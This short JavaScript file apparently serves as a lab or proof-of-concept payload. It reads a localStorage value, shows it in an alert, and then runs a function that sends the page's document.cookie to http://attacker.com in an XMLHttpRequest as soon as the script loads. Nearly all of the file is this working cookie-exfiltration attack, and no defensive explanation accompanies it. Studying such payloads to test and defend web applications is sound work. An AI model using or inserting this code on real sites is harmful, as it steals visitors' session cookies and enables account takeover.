var fromStorage = localStorage.getItem('test');
alert("This was retrieved from script.js "+JSON.stringify(fromStorage));
console.log(fromStorage);


function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
     //document.getElementById("demo").innerHTML = this.responseText;
	    alert(this.responseText);
    }
  };
  xhttp.open("GET", "http://attacker.com/?cookie="+document.cookie, true);
  xhttp.send();
}
	loadDoc();
